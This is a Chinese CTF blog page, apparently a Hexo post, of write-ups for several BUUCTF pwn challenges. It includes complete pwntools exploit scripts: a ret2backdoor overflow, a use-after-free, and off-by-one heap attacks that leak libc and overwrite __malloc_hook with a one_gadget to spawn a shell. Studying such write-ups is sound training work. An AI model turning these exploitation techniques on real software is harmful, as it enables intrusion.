@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    BUU-PWN题（41-80） |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-owh91m" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      BUU-PWN题（41-80）
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/06/25/owh91m/" class="article-date">
+  <time datetime="2020-06-24T23:40:41.000Z" itemprop="datePublished">2020-06-25</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><p>一开始要求输入一个长度，长度还不能大于 10，但是输入的长度是一个有符号数，可以输入一个负数，然后到了后面成了无符号数，就可以成为一个很大的数字了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593042107276-452de5c4-0a78-4161-b72b-23580e5d67b1.png#align=left&display=inline&height=445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=501&originWidth=580&size=39491&status=done&style=none&width=515" alt="image.png"></p>
+<p>同时，程序还有一个后门</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593042265781-a444c9c7-e374-4911-bda9-030795402805.png#align=left&display=inline&height=95&margin=%5Bobject%20Object%5D&name=image.png&originHeight=100&originWidth=227&size=3860&status=done&style=none&width=216" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./babystack')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27269</span>)</span><br><span class="line">size=<span class="number">-1</span></span><br><span class="line">back_door=<span class="number">0x400726</span></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,str(size))</span><br><span class="line"><span class="comment">#payload='aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span>+p64(back_door)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">'name?\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593132715424-f71bfda9-e79c-4453-af4e-e179afc1fb9f.png#align=left&display=inline&height=224&margin=%5Bobject%20Object%5D&name=image.png&originHeight=236&originWidth=303&size=9539&status=done&style=none&width=287" alt="image.png"></p>
+<p>释放之后没有置为 0</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593133722904-734a9f3a-0e46-4f7b-bc20-a8266c359511.png#align=left&display=inline&height=412&margin=%5Bobject%20Object%5D&name=image.png&originHeight=464&originWidth=365&size=23348&status=done&style=none&width=324" alt="image.png"></p>
+<p>程序还有一个后门</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593133854526-f1ca3f47-a29c-4f94-b036-25678c5db0d0.png#align=left&display=inline&height=79&margin=%5Bobject%20Object%5D&name=image.png&originHeight=81&originWidth=247&size=3005&status=done&style=none&width=240" alt="image.png"></p>
+<p>思路是首先申请两个，然后释放掉，在申请的时候申请一个 0x8 大小的，这样就能申请到第 0 个的结构体那个地方，然后写入后门的地址（本来结构体这个地方放的是 print_note_content）,这样当展示 note 的时候就会调用后门</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28416</span>)</span><br><span class="line">magic_addr=<span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'choice :'</span>,str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'size :'</span>,str(size))</span><br><span class="line">  p.sendlineafter(<span class="string">'Content :'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'Index :'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">  cmd(<span class="number">3</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'Index :'</span>,str(index))</span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>,<span class="string">'aaaa'</span>) <span class="comment">#0</span></span><br><span class="line">addnote(<span class="number">16</span>,<span class="string">'bbbb'</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(magic_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h1><p>一个笔记系统，先添加然后才能编辑，在编辑的时候，如果输入的 size 比之前创建的时候大 10 的话，就会造成 off by one</p>
+<p>先放一下 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',26046)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'choice: '</span>,str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'size: '</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'index: '</span>,str(index))</span><br><span class="line">  p.sendlineafter(<span class="string">'size: '</span>,str(size))</span><br><span class="line">  p.sendlineafter(<span class="string">'content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drop</span><span class="params">(index)</span>:</span></span><br><span class="line">  cmd(<span class="number">3</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'index: '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">  cmd(<span class="number">4</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'index: '</span>,str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">write(<span class="number">0</span>, <span class="number">0x58</span> + <span class="number">0xa</span>, <span class="string">'a'</span>* <span class="number">0x58</span> + <span class="string">'\xe1'</span>)</span><br><span class="line">drop(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 = 1</span></span><br><span class="line">show(<span class="number">2</span>) <span class="comment">#2 is unsortbin</span></span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = address - <span class="number">0x58</span> - <span class="number">0x3c4b20</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">main_arean = address - <span class="number">0x58</span></span><br><span class="line">one = <span class="number">0x4526a</span></span><br><span class="line">realloc = libc_base + <span class="number">0x846c0</span></span><br><span class="line"><span class="keyword">print</span> hex(realloc)</span><br><span class="line">fake_chunk = main_arean - <span class="number">0x33</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#2(5)</span></span><br><span class="line">drop(<span class="number">2</span>)</span><br><span class="line">write(<span class="number">5</span>, <span class="number">0x8</span>, p64(fake_chunk))</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#5 = 2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#6 fake chunk</span></span><br><span class="line">realloc_addr=libc_base+libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">11</span> + p64(one + libc_base) + p64(realloc+<span class="number">2</span>)</span><br><span class="line">write(<span class="number">6</span>, len(payload), payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">create(<span class="number">255</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>希望把 chunk 放到 unsorted bin 中，然后通过 fd 指针来拿到 unsorted bin 的地址，从来获得 libc 的地址，但程序使用的是 colloc，他会把申请的内存块给清空，所以不能通过申请一个在 unsorted bin 范围内的 chunk，free 之后申请过来泄露地址，可以通过先申请几个，然后通过第 0 个的 off by one 把第 1 个的 size 给改掉，让他包含上第 2 个，然后把第一个 free 的时候，会把第 1 和 第 2 个一起放到 unsorted bin 中，然后申请回来第 1 个，这时候第二个的 fd 指针就指向了 unsorted bin 的地址</p>
+<p>首先申请一些堆块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x58</span>) <span class="comment">#0这一个必须要0x8结尾,不然的话没法溢出到size那里</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#4</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593246301322-4cd882a7-43f7-4e64-be0a-7422ddff2532.png#align=left&display=inline&height=406&margin=%5Bobject%20Object%5D&name=image.png&originHeight=579&originWidth=893&size=88725&status=done&style=none&width=626" alt="image.png"></p>
+<p>然后对第 0 个进行编辑 write(0, 0x58 + 0xa, ‘a’* 0x58 + ‘\xe1’) 通过 off by one 把第 1 个的 size 给改成 0xe1</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593246411502-adcb6f23-945d-473c-bd27-341826e80718.png#align=left&display=inline&height=397&margin=%5Bobject%20Object%5D&name=image.png&originHeight=564&originWidth=890&size=86215&status=done&style=none&width=626" alt="image.png"></p>
+<p>这时候 free 掉第 1 个，会放到 unsorted bin 中，然后他的 fd、bk 会指向 unsorted bin 的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593246516240-6ffce37e-6b28-49f6-90d6-a066fa070df3.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=563&originWidth=891&size=87466&status=done&style=none&width=626" alt="image.png"></p>
+<p>这时候我们去把第 1 个申请回来，因为是 colloc 所以会置 0，但是我们可以用第 2 个来获得 unsorted bin 的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593246630162-68906576-d63d-411b-b106-519a70f31d96.png#align=left&display=inline&height=409&margin=%5Bobject%20Object%5D&name=image.png&originHeight=581&originWidth=891&size=96413&status=done&style=none&width=627" alt="image.png"></p>
+<p>这个地址是 unsorted bin 链表的头部，跟 main_arena 的偏移固定 0x58，同时 main_arena 跟 libc 的偏移可以通过工具计算出来 <a href="https://github.com/bash-c/main_arena_offset" target="_blank" rel="noopener">https://github.com/bash-c/main_arena_offset</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593247030696-31d0fb00-f705-4d0e-bdfc-85f3b1c691b7.png#align=left&display=inline&height=117&margin=%5Bobject%20Object%5D&name=image.png&originHeight=152&originWidth=719&size=44061&status=done&style=none&width=554" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">2</span>) <span class="comment">#2 is unsortbin</span></span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = address - <span class="number">0x58</span> - <span class="number">0x3c4b20</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再去申请 unsorted bin 中剩下的那块，这算第 5 个（第 2 个也指向他）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593248200097-e55fd64c-11fc-4dc4-84be-73ea37b0c866.png#align=left&display=inline&height=380&margin=%5Bobject%20Object%5D&name=image.png&originHeight=580&originWidth=891&size=91715&status=done&style=none&width=584" alt="image.png"></p>
+<p>然后通过编辑第 5 个来修改他的 fd 的内容为 main_arean - 0x33 在 malloc_hook 附近，这个偏移是为了通过 size 的检查，这样能让他有个 0x7f 的 size</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593248958371-46d7011d-db28-4eb5-a782-4cb23939c7ab.png#align=left&display=inline&height=282&margin=%5Bobject%20Object%5D&name=image.png&originHeight=380&originWidth=750&size=94415&status=done&style=none&width=556" alt="image.png"></p>
+<p>然后申请两次，就会申请到 fake_chunk（第 6 个），这时候编辑第六个的内容为<br>‘\x00’*11 + p64(one + libc_base) + p64(realloc+2)</p>
+<p>前面的 11 个 ‘\x00’ 有 3 个是为了把错位给纠正过来，然后一个 0x10 是为了占空，再往后写就是覆写 relloc_hook 了，然后是 malloc_hook 的内容</p>
+<p>这样写的原因是，one_gadget 的执行有时候需要一些条件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593251088902-6ec00440-78e8-4937-9ecb-7a3d3d219e35.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&name=image.png&originHeight=275&originWidth=700&size=45695&status=done&style=none&width=481" alt="image.png"></p>
+<p>当不满足这些条件的时候，可以通过调用 realloc 函数调整 rsp<br>（可以试一下哪些可以正常用，比如这道题就是 realloc_addr+2）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593251254882-2e133ab5-75ef-43c7-aa67-dc08e83b46e1.png#align=left&display=inline&height=163&margin=%5Bobject%20Object%5D&name=image.png&originHeight=244&originWidth=973&size=77887&status=done&style=none&width=649" alt="image.png"></p>
+<p>所以上面意思是，先把 one_gadget 写到 realloc_hook 中，然后把 realloc_hook 写到 malloc_hook 中，当去 malloc 的时候会先去执行 malloc_hook（这里就是 realloc_hook），然后执行 realloc_hook 里的 one_gadget 从而拿到 shell</p>
+<h1 id="V-amp-N2020-公开赛-simpleHeap"><a href="#V-amp-N2020-公开赛-simpleHeap" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap"></a>[V&amp;N2020 公开赛]simpleHeap</h1><p>跟上面那个大同小异，EXP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',29221)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'choice: '</span>,str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line">  p.sendlineafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line">  p.sendlineafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">  cmd(<span class="number">3</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  cmd(<span class="number">4</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'idx?'</span>,str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">'aaaa'</span>) <span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'bbbb'</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'cccc'</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'dddd'</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'a'</span>* <span class="number">0x58</span> + <span class="string">'\xe1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'ffff'</span>) <span class="comment">#4(1)</span></span><br><span class="line">show(<span class="number">2</span>) <span class="comment">#2 is unsortbin</span></span><br><span class="line">address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = address - <span class="number">0x58</span> - <span class="number">0x3c4b20</span></span><br><span class="line">main_arean = address - <span class="number">0x58</span></span><br><span class="line">one_gadget = libc_base+<span class="number">0x4526a</span></span><br><span class="line">realloc = libc_base + <span class="number">0x846c0</span></span><br><span class="line">fake_chunk = main_arean - <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">'yichen'</span>) <span class="comment">#4(2)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>, p64(fake_chunk))</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload+= p64(libc_base+<span class="number">0x846C0</span>+<span class="number">0xc</span>)</span><br><span class="line">create(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"size?"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>实现了这么些功能</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593302072235-70166cb4-b6f1-4758-b8dd-5cb6a5dcb223.png#align=left&display=inline&height=211&margin=%5Bobject%20Object%5D&name=image.png&originHeight=183&originWidth=252&size=7405&status=done&style=none&width=291" alt="image.png"></p>
+<p>在 edit 的时候，应该是 &gt;=，这里是 &gt; 造成了 off by one</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593304247631-5a546a4c-7149-4e64-8e8f-d5e55fedd967.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=421&originWidth=508&size=24741&status=done&style=none&width=475" alt="image.png"></p>
+<p>先申请一些堆空间，注意第 0 个大小是 0x58，是为了占用第 1 个的 prev_size，待会能够 off by one</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593305497662-e0a6351a-fc9a-44c0-b5e5-560044b6c3bf.png#align=left&display=inline&height=386&margin=%5Bobject%20Object%5D&name=image.png&originHeight=580&originWidth=892&size=91644&status=done&style=none&width=593" alt="image.png"></p>
+<p>成功覆盖掉下一个的 size 位</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593307059226-fc731cc6-83c9-49c7-8bbc-b200934afec8.png#align=left&display=inline&height=358&margin=%5Bobject%20Object%5D&name=image.png&originHeight=566&originWidth=892&size=90476&status=done&style=none&width=564" alt="image.png"></p>
+<p>这时候对刚才修改的那个 chunk 进行 free，他会放到 unsorted bin 中，同时 fd、bk 指向 unsorted bin</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593307593957-7e55df0d-5568-4fa4-84c4-01aec88fa4a8.png#align=left&display=inline&height=355&margin=%5Bobject%20Object%5D&name=image.png&originHeight=440&originWidth=589&size=52923&status=done&style=none&width=475" alt="image.png"></p>
+<p>但是这个是释放的，没法 show，那先把他申请掉，然后通过 show 他后面的第 2 个来获得 unsorted bin 的地址，来计算 libc</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593308351163-e76b4422-c767-41bf-a1a2-a5fca7bba92d.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=445&originWidth=530&size=52342&status=done&style=none&width=472" alt="image.png"></p>
+<p>看一下各个偏移</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593308435362-e088613e-8cc3-45b2-a2e3-9cc17c84d81c.png#align=left&display=inline&height=223&margin=%5Bobject%20Object%5D&name=image.png&originHeight=343&originWidth=718&size=67003&status=done&style=none&width=467" alt="image.png"></p>
+<p>下面再申请一个，他与第 2 个指向相同的地址 <code>create(0x60,&#39;yichen&#39;)</code> 把他叫做第 4 个</p>
+<p>然后释放掉第 3、2 个，通过第 4 个编辑第 2 个的 fd 指针为 fake_chunk 的地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1593323414183-fbfeea34-3818-4e59-b9fc-28ecc3a26632.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=566&originWidth=888&size=90780&status=done&style=none&width=525" alt="image.png"></p>
+<p>然后再去申请，第一次是把第 2 个申请回来（这里我纠结了好久，以为他要一直保存这个 fake_chunk 的地址，改了半天也没打通，结果又拿上一道题仔细看了一下，申请回来之后覆盖掉也没关系），然后就是第 2 个的 fd 指针指向的位置了，所以第二次申请就该发 payload 了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload+= p64(libc_base+<span class="number">0x846C0</span>+<span class="number">0xc</span>)</span><br><span class="line">create(<span class="number">0x60</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>然后再去 malloc 一下就行了，但因为我们改掉了 malloc_hook，不会返回 ‘content:’ 了，如果用上面定义的 create 会一直等待，所以单独拿出来去申请一下就行了</p>
+<h1 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj_test_your_memory"></a>jarvisoj_test_your_memory</h1><p>程序有一个 system 函数，可以找到 cat flag 的字符串<br>0x080485BD 0x80487E0</p>
